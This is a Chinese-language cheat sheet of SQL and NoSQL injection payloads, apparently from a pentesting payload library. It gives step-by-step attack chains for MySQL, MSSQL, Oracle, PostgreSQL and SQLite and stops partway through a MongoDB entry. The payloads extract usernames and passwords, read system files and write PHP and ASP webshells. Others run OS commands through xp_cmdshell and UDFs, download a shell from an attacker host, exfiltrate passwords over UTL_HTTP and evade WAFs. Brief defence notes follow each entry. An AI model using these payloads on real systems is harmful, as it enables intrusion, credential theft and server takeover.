# SQL/NoSQL注入

_17 条 web payload_

### MySQL注入 - 基础探测  `sqli-mysql-basic`
_MySQL数据库注入基础探测与数据提取技术_
子类：**MySQL** · tags: `sqli` `mysql` `injection` `database`

**前置条件：**
- 目标存在SQL注入点
- 后端数据库为MySQL
- 了解基本SQL语法

**攻击链：**

**1. 探测注入点**
> 使用单引号和布尔条件探测是否存在注入点
```
' OR '1'='1
' OR 1=1--
1' AND '1'='1
1' AND '1'='2
```
**语法解析：**
- `OR '1'='1'` — 逻辑永真 _keyword_
- `--` — SQL注释 _operator_

**2. 确定列数**
> 使用ORDER BY或UNION SELECT NULL确定查询列数
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
直到报错确定列数
或使用:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
**语法解析：**
- `ORDER BY` — 按指定列排序 _value_
- `NULL` — 空值占位符 _keyword_

**3. 确定显示位置**
> 找出哪些列会显示在页面上
```
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
```
**语法解析：**
- `UNION SELECT` — 联合查询，合并结果集 _value_
- `1,2,3` — 数字标记显示位置 _value_

**4. 获取数据库信息**
> 获取当前数据库名、用户、版本等基础信息
```
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,@@hostname,3--
```
**语法解析：**
- `database()` — 返回当前数据库名 _function_
- `user()` — 返回当前用户 _function_
- `version()` — 返回MySQL版本 _function_

**5. 枚举所有数据库**
> 获取MySQL服务器上所有数据库名
```
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
' UNION SELECT schema_name,2,3 FROM information_schema.schemata LIMIT 0,1--
```
**语法解析：**
- `information_schema` — MySQL系统数据库，存储元数据 _keyword_
- `schemata` — 存储所有数据库名的表 _value_
- `group_concat()` — 将多行合并为一行 _function_

**6. 枚举表名**
> 获取指定数据库中的所有表名
```
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1--
```
**语法解析：**
- `information_schema.tables` — 存储所有表信息的系统表 _value_
- `table_schema` — 表所属的数据库名 _value_
- `table_name` — 表名 _value_

**7. 枚举列名**
> 获取指定表的所有列名
```
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 0,1--
```
**语法解析：**
- `information_schema.columns` — 存储所有列信息的系统表 _value_
- `column_name` — 列名 _value_

**8. 提取数据**
> 从目标表中提取敏感数据
```
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
' UNION SELECT username,password,3 FROM users LIMIT 0,1--
```
**语法解析：**
- `0x3a` — 冒号的十六进制，用于分隔符 _encoding_
- `LIMIT 0,1` — 限制返回第一行结果 _value_

**WAF/EDR 绕过变体：**

**大小写混淆**
> 使用大小写混合绕过关键字过滤
```
' UnIoN SeLeCt 1,database(),3--
' uNiOn SeLeCt 1,user(),3--
```
**语法解析：**
- `UnIoN SeLeCt` — 混合大小写绕过简单关键字匹配 _value_

**内联注释**
> 使用MySQL特有内联注释绕过
```
' /*!UNION*/ /*!SELECT*/ 1,database(),3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
```
**语法解析：**
- `/*!UNION*/` — MySQL会执行注释内的SQL _value_
- `/*!50000` — 指定MySQL版本5.00.00以上执行 _value_

**双写绕过**
> 双写关键字绕过替换过滤
```
' UNUNIONION SELSELECTECT 1,database(),3--
' UNIunionON SELselectECT 1,2,3--
```
**语法解析：**
- `UNUNIONION` — WAF删除UNION后变成UNION _value_
- `SELSELECTECT` — WAF删除SELECT后变成SELECT _value_

**空格替代**
> 使用注释、换行、括号替代空格
```
'/**/UNION/**/SELECT/**/1,database(),3--
' %0aUNION%0aSELECT%0a1,2,3--
'(UNION(SELECT(1),(database()),(3)))--
```
**语法解析：**
- `/**/` — 注释替代空格 _operator_
- `%0a` — 换行符URL编码 _encoding_
- `()` — 括号包裹替代空格 _value_

**编码绕过**
> 使用编码函数绕过关键字检测
```
' UNION SELECT 1,hex(database()),3--
' UNION SELECT 1,unhex(hex(database())),3--
' UNION SELECT 1,conv(hex(database()),16,10),3--
```
**语法解析：**
- `hex()` — 十六进制编码 _function_
- `unhex()` — 十六进制解码 _function_
- `conv()` — 进制转换 _function_


**概述：** MySQL注入是最常见的数据库注入类型，通过构造恶意SQL语句获取或修改数据库数据。攻击者可以利用注入漏洞读取敏感数据、写入WebShell甚至执行系统命令。

**漏洞原理：** 应用程序未对用户输入进行充分过滤，直接拼接到SQL语句中执行。常见于搜索框、登录表单、URL参数等输入点。

**利用方法：** 完整利用流程：
1. 探测注入点：使用单引号、布尔条件确认是否存在注入
2. 确定列数：使用ORDER BY或UNION SELECT NULL
3. 确定显示位置：找出哪些列会回显到页面
4. 获取数据库信息：database()、user()、version()
5. 枚举数据库结构：information_schema库
6. 提取敏感数据：用户名、密码等
7. 尝试提权：文件读写、UDF提权

**防御措施：** 防御措施：
1. 使用参数化查询(PDO、预处理语句)
2. 输入验证和白名单过滤
3. 最小权限原则，限制数据库用户权限
4. 禁用或限制FILE权限
5. 设置secure_file_priv为NULL
6. 部署WAF防护
7. 错误信息不泄露数据库详情

---

### MySQL注入 - 高级技术  `sqli-mysql-advanced`
_MySQL高级注入技术：文件读写、UDF提权、命令执行_
子类：**MySQL** · tags: `sqli` `mysql` `advanced` `file-read` `rce`

**前置条件：**
- MySQL用户具有FILE权限
- 知道网站绝对路径
- secure_file_priv配置允许

**攻击链：**

**1. 检测FILE权限**
> 检测当前用户是否有FILE权限
```
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--
' AND (SELECT file_priv FROM mysql.user WHERE user=current_user())='Y'--
```
**语法解析：**
- `mysql.user` — MySQL用户权限表 _value_
- `file_priv` — FILE权限字段 _value_
- `current_user()` — 返回当前用户 _function_

**2. 获取网站路径**
> 通过错误信息或读取文件获取网站路径
```
' UNION SELECT 1,@@basedir,3--
' UNION SELECT 1,@@datadir,3--
' UNION SELECT 1,load_file('/etc/passwd'),3--
```
**语法解析：**
- `@@basedir` — MySQL安装目录 _value_
- `@@datadir` — MySQL数据目录 _value_

**3. 读取敏感文件**
> 使用load_file读取系统敏感文件
```
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,load_file('/var/www/html/config.php'),3--
' UNION SELECT 1,load_file('C:/windows/win.ini'),3--
```
**语法解析：**
- `load_file()` — MySQL读取文件函数 _function_
- `/etc/passwd` — Linux用户信息文件 _path_

**4. 写入WebShell**
> 使用INTO OUTFILE写入WebShell
_platform: linux_
```
' UNION SELECT 1,'<?php @eval($_POST[cmd]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/cmd.php'--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT` — 查询数据 _keyword_
- `INTO OUTFILE` — 写入文件 _keyword_
- `--` — SQL注释 _operator_
- `system()` — 系统命令执行 _function_
- `eval()` — 代码执行 _function_

**5. 日志写Shell**
> 通过开启general_log写入Shell
_platform: linux_
```
SET GLOBAL general_log='ON';
SET GLOBAL general_log_file='/var/www/html/shell.php';
SELECT '<?php @eval($_POST[cmd]);?>';
```
**语法解析：**
- `general_log` — MySQL通用查询日志开关 _value_
- `general_log_file` — 日志文件路径 _value_

**6. UDF提权**
> 使用UDF提权执行系统命令
_platform: linux_
```
SELECT load_file('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('id');
```
**语法解析：**
- `INTO DUMPFILE` — 写入二进制文件 _keyword_
- `CREATE FUNCTION` — 创建自定义函数 _value_
- `sys_eval` — 执行系统命令的UDF函数 _value_

**WAF/EDR 绕过变体：**

**Hex编码写入**
> 使用十六进制编码绕过关键字检测
_platform: linux_
```
' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,3 INTO DUMPFILE '/var/www/html/shell.php'--
```
**语法解析：**
- `0x3c3f706870...` — PHP一句话的十六进制编码 _value_
- `INTO DUMPFILE` — 写入二进制文件 _keyword_

**Char编码绕过**
> 使用CHAR函数编码绕过
_platform: linux_
```
' UNION SELECT 1,CHAR(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62),3 INTO OUTFILE '/var/www/html/s.php'--
```
**语法解析：**
- `CHAR(60,63...)` — 使用ASCII码值构造字符串 _value_


**概述：** MySQL高级注入技术可以实现文件读取、WebShell写入甚至系统命令执行。这些技术需要较高的数据库权限和特定的配置条件。

**漏洞原理：** MySQL的FILE权限允许读写文件，配合secure_file_priv配置不当可导致严重后果。UDF提权可以执行任意系统命令。

**利用方法：** 完整利用流程：
1. 检测FILE权限和secure_file_priv配置
2. 获取网站绝对路径
3. 使用load_file读取敏感配置
4. 使用INTO OUTFILE写入WebShell
5. 如果OUTFILE被禁，使用日志写Shell
6. 尝试UDF提权获取系统Shell

**防御措施：** 防御措施：
1. 限制FILE权限，不给Web应用用户
2. 设置secure_file_priv=NULL禁止文件操作
3. 禁用INTO OUTFILE和INTO DUMPFILE
4. 使用AppArmor/SELinux限制MySQL文件访问
5. 监控异常的文件读写操作

---

### MSSQL注入 - 基础探测  `sqli-mssql-basic`
_Microsoft SQL Server数据库注入技术_
子类：**MSSQL** · tags: `sqli` `mssql` `sqlserver` `injection`

**前置条件：**
- 目标存在SQL注入点
- 后端使用MSSQL数据库

**攻击链：**

**1. 探测注入点**
> 基础注入探测
```
' OR 1=1--
' OR '1'='1
1' AND 1=1--
1' AND 1=2--
```
**语法解析：**
- `--` — MSSQL单行注释符 _operator_
- `OR 1=1` — 永真条件 _value_

**2. 获取版本信息**
> 获取MSSQL版本信息
```
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,SERVERPROPERTY('Edition'),3--
' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--
```
**语法解析：**
- `@@version` — 返回SQL Server版本 _value_
- `SERVERPROPERTY()` — 返回服务器属性信息 _function_

**3. 获取用户信息**
> 获取当前用户及权限信息
```
' UNION SELECT 1,user_name(),3--
' UNION SELECT 1,suser_name(),3--
' UNION SELECT 1,system_user,3--
' UNION SELECT 1,is_srvrolemember('sysadmin'),3--
```
**语法解析：**
- `user_name()` — 返回当前数据库用户 _function_
- `suser_name()` — 返回登录名 _function_
- `is_srvrolemember()` — 检查是否属于服务器角色 _function_

**4. 获取数据库信息**
> 获取所有数据库名
```
' UNION SELECT 1,db_name(),3--
' UNION SELECT 1,db_name(0),3--
' UNION SELECT 1,db_name(1),3--
' UNION SELECT name,2,3 FROM master..sysdatabases--
```
**语法解析：**
- `db_name()` — 返回当前数据库名 _function_
- `db_name(N)` — 返回第N个数据库名 _value_
- `master..sysdatabases` — 系统数据库，存储所有库信息 _value_

**5. 获取表名**
> 获取用户表名
```
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
' UNION SELECT 1,name,3 FROM sys.tables--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT...FROM` — 查询数据 _keyword_
- `WHERE` — 条件筛选 _keyword_
- `information_schema` — 元数据库 _value_
- `--` — SQL注释 _operator_

**6. 获取列名**
> 获取指定表的列名
```
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
```
**语法解析：**
- `syscolumns` — 系统列信息表 _value_
- `information_schema.columns` — 标准信息模式视图 _value_

**7. 提取数据**
> 提取表中的数据
```
' UNION SELECT 1,username+':'+password,3 FROM users--
' UNION SELECT TOP 1 username,password,3 FROM users--
```
**语法解析：**
- `+` — MSSQL字符串连接符 _operator_
- `TOP 1` — 返回第一条记录 _value_

**WAF/EDR 绕过变体：**

**Hex编码**
> 使用Hex编码绕过
```
' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--
```
**语法解析：**
- `fn_varbintohexstr()` — 转换为十六进制字符串 _function_

**注释绕过**
> 使用注释和空字节绕过
```
'/**/UNION/**/SELECT/**/1,2,3--
' UN%00ION SELECT 1,2,3--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT` — 查询数据 _keyword_
- `--` — SQL注释 _operator_
- `/*...*/` — 内联注释 _operator_
- `%xx` — URL编码 _encoding_


**概述：** MSSQL注入与MySQL类似，但语法和系统表有所不同。MSSQL提供了更多强大的存储过程，可以执行系统命令。

**漏洞原理：** 应用程序未对用户输入进行充分过滤，直接拼接到SQL语句中执行。MSSQL特有的存储过程增加了攻击面。

**利用方法：** 完整利用流程：
1. 探测注入点类型
2. 获取版本和用户信息
3. 枚举数据库结构
4. 提取敏感数据
5. 尝试使用xp_cmdshell执行命令

**防御措施：** 防御措施：
1. 使用参数化查询
2. 最小权限原则
3. 禁用xp_cmdshell等危险存储过程
4. 使用存储过程封装业务逻辑

---

### MSSQL注入 - 高级技术  `sqli-mssql-advanced`
_MSSQL高级注入：xp_cmdshell、SP_OACREATE命令执行_
子类：**MSSQL** · tags: `sqli` `mssql` `xp_cmdshell` `rce`

**前置条件：**
- MSSQL具有高权限
- xp_cmdshell可用或可开启

**攻击链：**

**1. 检测xp_cmdshell状态**
> 检测xp_cmdshell是否可用
_platform: windows_
```
' UNION SELECT 1,OBJECT_ID('xp_cmdshell'),3--
'; EXEC master..xp_cmdshell 'whoami'--
```
**语法解析：**
- `OBJECT_ID()` — 检查对象是否存在 _function_
- `xp_cmdshell` — 执行系统命令的扩展存储过程 _keyword_

**2. 开启xp_cmdshell**
> 如果xp_cmdshell被禁用，尝试开启
_platform: windows_
```
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```
**语法解析：**
- `xp_cmdshell` — 系统命令执行 _function_
- `EXEC` — 执行存储过程 _keyword_
- `--` — SQL注释 _operator_

**3. 执行系统命令**
> 使用xp_cmdshell执行系统命令
_platform: windows_
```
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC master..xp_cmdshell 'net user'--
'; EXEC master..xp_cmdshell 'dir C:'--
```
**语法解析：**
- `master..xp_cmdshell` — 调用master数据库中的xp_cmdshell _value_

**4. 写入WebShell**
> 写入或下载WebShell
_platform: windows_
```
'; EXEC master..xp_cmdshell 'echo ^<%execute(request("cmd"))^> > C:\inetpub\wwwroot\shell.asp'--
'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\inetpub\wwwroot\shell.aspx'--
```
**语法解析：**
- `echo` — 写入文件内容 _command_
- `certutil` — Windows内置下载工具 _value_

**5. SP_OACREATE方法**
> 使用SP_OACREATE执行命令
_platform: windows_
```
'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC SP_OACREATE 'wscript.shell', @shell OUTPUT;
EXEC SP_OAMETHOD @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';--
```
**语法解析：**
- `SP_OACREATE` — 创建OLE自动化对象 _keyword_
- `wscript.shell` — Windows脚本宿主对象 _value_
- `SP_OAMETHOD` — 调用对象方法 _value_

**WAF/EDR 绕过变体：**

**堆叠查询**
> 使用动态SQL绕过
_platform: windows_
```
'; EXEC('EXEC master..xp_cmdshell ''whoami''')--
'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--
```
**语法解析：**
- `EXEC()` — 执行动态SQL _function_
- `DECLARE` — 声明变量 _keyword_


**概述：** MSSQL高级注入利用xp_cmdshell和SP_OACREATE等存储过程可以执行系统命令，实现完全控制服务器。

**漏洞原理：** MSSQL高级注入利用数据库特有功能如xp_cmdshell存储过程执行系统命令、OPENROWSET进行带外数据外泄、利用堆叠查询执行多条SQL语句。MSSQL的错误信息通常较为详细，可通过错误注入提取数据库版本、表结构等敏感信息。

**利用方法：** 完整利用流程：
1. 检测当前用户权限
2. 尝试开启xp_cmdshell
3. 执行系统命令
4. 写入WebShell或添加用户
5. 如果xp_cmdshell被禁，尝试SP_OACREATE

**防御措施：** 防御措施：
1. 禁用xp_cmdshell和Ole Automation Procedures
2. 使用最小权限账户
3. 使用存储过程封装业务逻辑
4. 部署WAF防护

---

### Oracle注入 - 基础探测  `sqli-oracle-basic`
_Oracle数据库注入基础技术_
子类：**Oracle** · tags: `sqli` `oracle` `injection`

**前置条件：**
- 目标存在SQL注入点
- 后端使用Oracle数据库

**攻击链：**

**1. 探测注入点**
> 探测注入点类型
```
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL FROM DUAL--
```
**语法解析：**
- `FROM DUAL` — Oracle虚拟表，SELECT必须有FROM _value_
- `NULL,NULL,NULL` — 探测列数 _value_

**2. 获取版本信息**
> 获取Oracle版本
```
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--
' UNION SELECT version,NULL FROM v$instance--
```
**语法解析：**
- `v$version` — Oracle版本信息视图 _value_
- `v$instance` — 实例信息视图 _value_
- `rownum=1` — 限制返回一行 _value_

**3. 获取用户信息**
> 获取数据库用户
```
' UNION SELECT username,NULL FROM all_users--
' UNION SELECT user,NULL FROM DUAL--
' UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL--
```
**语法解析：**
- `all_users` — 所有用户视图 _value_
- `user` — 当前用户 _value_
- `SYS_CONTEXT` — 获取会话上下文信息 _value_

**4. 获取表名**
> 获取表名
```
' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SCOTT'--
' UNION SELECT owner||'.'||table_name,NULL FROM all_tables--
```
**语法解析：**
- `all_tables` — 所有表视图 _value_
- `owner` — 表所属用户 _value_
- `||` — Oracle字符串连接符 _operator_

**5. 获取列名**
> 获取列名和数据类型
```
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT column_name||':'||data_type,NULL FROM all_tab_columns WHERE table_name='USERS'--
```
**语法解析：**
- `all_tab_columns` — 所有列信息视图 _value_
- `data_type` — 列数据类型 _value_

**6. 提取数据**
> 提取表数据
```
' UNION SELECT username||':'||password,NULL FROM users--
' UNION SELECT * FROM (SELECT username,password FROM users) WHERE rownum<=1--
```
**语法解析：**
- `rownum<=1` — Oracle分页方式 _value_

**WAF/EDR 绕过变体：**

**UTL_HTTP外带**
> 使用UTL_HTTP外带数据
```
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)),NULL FROM DUAL--
```
**语法解析：**
- `UTL_HTTP.REQUEST()` — 发起HTTP请求 _function_


**概述：** Oracle数据库注入需要掌握特有的语法和系统视图。Oracle提供了丰富的内置包可以实现更多功能。

**漏洞原理：** Oracle数据库注入的特殊性在于其严格的语法要求：SELECT必须带FROM子句(可用dual伪表)、字符串连接使用||运算符、注释使用--而非#。Oracle的数据字典(all_tables/all_tab_columns)是信息枚举的关键入口。

**利用方法：** 完整利用流程：
1. 探测注入点和列数
2. 获取数据库版本和用户
3. 枚举表和列
4. 提取敏感数据
5. 尝试使用UTL_HTTP等包外带数据

**防御措施：** 防御措施：
1. 使用参数化查询
2. 最小权限原则
3. 禁用危险包如UTL_HTTP
4. 使用DBMS_ASSERT验证输入

---

### Oracle注入 - 高级技术  `sqli-oracle-advanced`
_Oracle高级注入技术：Java存储过程、UTL_FILE文件操作_
子类：**Oracle** · tags: `sqli` `oracle` `advanced` `rce`

**前置条件：**
- Oracle高权限
- Java虚拟机可用

**攻击链：**

**1. 检测Java权限**
> 检测Java存储过程是否可用
```
' UNION SELECT 1,CASE WHEN DBMS_JAVA.TEST_OUTPUT('test') IS NOT NULL THEN 'YES' ELSE 'NO' END FROM DUAL--
```
**语法解析：**
- `DBMS_JAVA` — Oracle Java包 _value_
- `TEST_OUTPUT` — 测试Java功能 _value_

**2. 创建Java执行函数**
> 使用Java执行系统命令
```
' UNION SELECT 1,(SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.exec("cmd /c whoami")') FROM DUAL)--
```
**语法解析：**
- `DBMS_JAVA.RUNJAVA` — 执行Java代码 _value_
- `Runtime.exec` — Java执行系统命令 _value_

**3. UTL_FILE读取文件**
> 使用UTL_FILE操作文件
```
' UNION SELECT 1,UTL_FILE.FGETATTR('DATA_PUMP_DIR','/etc/passwd','file_exists') FROM DUAL--
```
**语法解析：**
- `UTL_FILE` — Oracle文件操作包 _value_
- `DATA_PUMP_DIR` — Oracle目录对象 _value_

**WAF/EDR 绕过变体：**

**Oracle特有函数绕过**
> 使用Oracle XMLType、DBMS_PIPE、CASE表达式等特有函数绕过WAF关键字检测
```
' UNION SELECT 1,XMLType('<root>'||CHR(60)||'data'||CHR(62)||user||'</data></root>') FROM DUAL--
' UNION SELECT 1,DBMS_PIPE.PACK_MESSAGE(user)||DBMS_PIPE.SEND_MESSAGE('pipe1') FROM DUAL--
' UNION SELECT 1,CASE WHEN (SELECT user FROM DUAL)='SYS' THEN 'admin' ELSE 'user' END FROM DUAL--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT...FROM` — 查询数据 _keyword_
- `CASE WHEN` — 条件表达式 _keyword_
- `--` — SQL注释 _operator_

**Oracle注释与编码绕过**
> 使用注释符替代空格、CHR()编码字符串、RAWTOHEX/UTL_ENCODE进行数据编码绕过
```
' UNION/**/SELECT/**/1,user/**/FROM/**/DUAL--
' UNION SELECT 1,CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78) FROM DUAL--
' UNION SELECT 1,RAWTOHEX(user) FROM DUAL--
' UNION SELECT 1,UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(user))) FROM DUAL--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT...FROM` — 查询数据 _keyword_
- `HEX()` — 十六进制编码 _encoding_
- `--` — SQL注释 _operator_
- `/*...*/` — 内联注释 _operator_
- `base64` — Base64编码 _encoding_


**概述：** Oracle高级注入技术利用PL/SQL块、UTL_HTTP进行带外通信、DBMS_PIPE实现延时注入、XMLType进行报错注入等Oracle特有功能进行深度利用。

**漏洞原理：** Oracle高级漏洞包括：通过UTL_HTTP/UTL_INADDR进行DNS带外数据外泄，利用DBMS_XMLGEN构造报错回显，PL/SQL注入绕过单语句限制，以及Java存储过程提权执行系统命令。

**利用方法：** 完整利用流程：
1. 检测Java权限
2. 使用DBMS_JAVA执行命令
3. 或使用UTL_FILE读写文件

**防御措施：** 防御Oracle高级注入需要：限制数据库用户权限(撤销UTL_HTTP、DBMS_XMLGEN等包的EXECUTE权限)，启用Oracle审计功能，使用绑定变量而非字符串拼接，配置网络ACL限制出站连接。

---

### PostgreSQL注入 - 基础探测  `sqli-postgres-basic`
_PostgreSQL数据库注入技术_
子类：**PostgreSQL** · tags: `sqli` `postgresql` `postgres` `injection`

**前置条件：**
- 目标存在SQL注入点
- 后端使用PostgreSQL

**攻击链：**

**1. 探测注入点**
> 探测注入点
```
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
```
**语法解析：**
- `--` — PostgreSQL注释符 _operator_

**2. 获取版本信息**
> 获取数据库信息
```
' UNION SELECT version(),NULL--
' UNION SELECT current_database(),NULL--
' UNION SELECT current_user,NULL--
```
**语法解析：**
- `version()` — PostgreSQL版本 _function_
- `current_database()` — 当前数据库 _function_
- `current_user` — 当前用户 _value_

**3. 获取表名**
> 获取public模式下的表
```
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
```
**语法解析：**
- `information_schema.tables` — 标准表信息视图 _value_
- `table_schema` — 模式名，public是默认模式 _value_

**4. 获取列名**
> 获取列名
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT...FROM` — 查询数据 _keyword_
- `WHERE` — 条件筛选 _keyword_
- `information_schema` — 元数据库 _value_
- `--` — SQL注释 _operator_

**5. 读取文件**
> 使用pg_read_file读取文件
_platform: linux_
```
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
' UNION SELECT pg_read_binary_file('/etc/passwd'),NULL--
```
**语法解析：**
- `pg_read_file()` — PostgreSQL读取文本文件 _function_
- `pg_read_binary_file()` — 读取二进制文件 _function_

**6. 写入文件**
> 使用COPY写入文件
_platform: linux_
```
' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--
```
**语法解析：**
- `COPY` — PostgreSQL COPY命令 _value_
- `TO` — 指定输出文件 _value_

**WAF/EDR 绕过变体：**

**编码绕过**
> 使用chr函数编码
```
' UNION SELECT chr(60)||chr(63)||'php system($_GET[c]);'||chr(63)||chr(62),NULL--
```
**语法解析：**
- `chr()` — 返回ASCII字符 _function_


**概述：** PostgreSQL注入与其他数据库类似，但有其特有的函数和语法。PostgreSQL提供了丰富的文件操作函数。

**漏洞原理：** PostgreSQL注入利用其丰富的类型转换系统和函数库：通过CAST/类型转换触发报错回显，利用pg_sleep()实现延时盲注，COPY TO/FROM进行文件读写操作，以及通过PL/pgSQL创建自定义函数执行系统命令。

**利用方法：** 完整利用流程：
1. 探测注入点
2. 获取数据库信息
3. 枚举表和列
4. 使用pg_read_file读取文件
5. 使用COPY写入WebShell

**防御措施：** 防御措施：
1. 使用参数化查询
2. 禁用pg_read_file等函数
3. 最小权限原则

---

### SQLite注入  `sqli-sqlite-basic`
_SQLite数据库注入攻击_
子类：**SQLite** · tags: `sqli` `sqlite`

**前置条件：**
- SQLite数据库
- 存在注入点

**攻击链：**

**1. 探测注入点**
> 探测注入点
```
' OR 1=1--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
```
**语法解析：**
- `UNION` — 合并查询结果集 _keyword_
- `SELECT` — 查询数据 _keyword_
- `--` — SQL注释 _operator_

**2. 获取版本**
> 获取SQLite版本
```
' UNION SELECT sqlite_version(),NULL--
```
**语法解析：**
- `sqlite_version()` — SQLite版本函数 _function_

**3. 获取表名**
> 获取所有表名
```
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
```
**语法解析：**
- `UNION` — 合并查询结果集 _keyword_
- `SELECT` — 查询数据 _keyword_
- `--` — SQL注释 _operator_

**4. 获取表结构**
> 获取建表语句
```
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'--
```
**语法解析：**
- `sql` — 建表SQL语句 _value_

**5. 读取文件**
> 读取文件(需要扩展)
```
' UNION SELECT load_extension('libsqlite3.so'),NULL--
' UNION SELECT readfile('/etc/passwd'),NULL--
```
**语法解析：**
- `load_extension` — 加载扩展库 _value_
- `readfile` — 读取文件(需扩展) _value_

**WAF/EDR 绕过变体：**

**SQLite字符编码绕过**
> 使用CHAR()函数构造字符串、X前缀十六进制字面量、typeof()和unicode()进行类型推断盲注绕过WAF
```
' UNION SELECT CHAR(116,101,115,116),NULL--
' UNION SELECT X'746573746461746131',NULL--
' AND typeof(CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>96 THEN 1 ELSE 0.0 END)='integer'--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT...FROM` — 查询数据 _keyword_
- `CASE WHEN` — 条件表达式 _keyword_
- `SUBSTRING` — 字符串截取 _function_
- `--` — SQL注释 _operator_

**SQLite运算符与函数替代**
> 使用LIKE/GLOB模式匹配替代等号、instr()替代SUBSTRING、group_concat配合replace混淆数据
```
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%user%')--
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name GLOB '*user*')--
' UNION SELECT replace(group_concat(name,','),'_',''),NULL FROM sqlite_master WHERE type='table'--
' AND instr((SELECT sql FROM sqlite_master LIMIT 1),'password')>0--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT...FROM` — 查询数据 _keyword_
- `WHERE` — 条件筛选 _keyword_
- `CONCAT` — 字符串拼接 _function_
- `GROUP_CONCAT` — 分组拼接 _function_
- `--` — SQL注释 _operator_


**概述：** SQLite是嵌入式数据库引擎，广泛用于移动应用、桌面软件和小型Web应用。其注入测试需要了解SQLite特有的语法和系统表(sqlite_master)结构。

**漏洞原理：** SQLite注入的特殊性在于：通过sqlite_master表枚举所有表和视图定义，使用typeof()确定列类型，利用group_concat()聚合多行数据，ATTACH DATABASE可创建新数据库文件实现写文件操作。

**利用方法：** SQLite注入利用步骤：1)通过sqlite_master获取表结构 2)使用UNION SELECT提取数据 3)利用ATTACH DATABASE写入webshell到可访问目录 4)或通过load_extension()加载恶意共享库执行代码。

**防御措施：** 防御SQLite注入：使用参数化查询(PreparedStatement)，严格验证和过滤用户输入，限制数据库文件权限防止ATTACH操作，禁用load_extension()功能，将数据库文件存放在Web根目录之外。

---

### MongoDB注入  `sqli-mongodb-basic`
_NoSQL数据库注入攻击技术_
子类：**MongoDB** · tags: `nosql` `mongodb` `injection`

**前置条件：**
- 目标使用MongoDB
- 存在用户输入拼接查询

**攻击链：**

**1. 探测注入点**
> 探测MongoDB注入
```
{"username": "admin", "password": "password"}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
```
**语法解析：**
